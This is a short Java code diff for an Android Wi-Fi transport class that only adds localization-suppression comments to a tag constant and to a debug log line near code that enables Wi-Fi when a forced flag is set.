@@ -21,7 +21,7 @@ import com.android.service.util.Check;
  * The Class WifiTransport.
  */
 public class WifiTransport extends HttpKeepAliveTransport {
-	private static final String TAG = "WifiTransport";
+	private static final String TAG = "WifiTransport"; //$NON-NLS-1$
 	/** The forced. */
 	private boolean forced;
 	private boolean switchedOn;
@@ -64,7 +64,7 @@ public class WifiTransport extends HttpKeepAliveTransport {
 		if (!wifi.isWifiEnabled()) {
 			if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " try to enable wifi");
+					Check.log(TAG + " try to enable wifi") ;//$NON-NLS-1$
 				}
 				available = wifi.setWifiEnabled(true);
 				switchedOn = available;
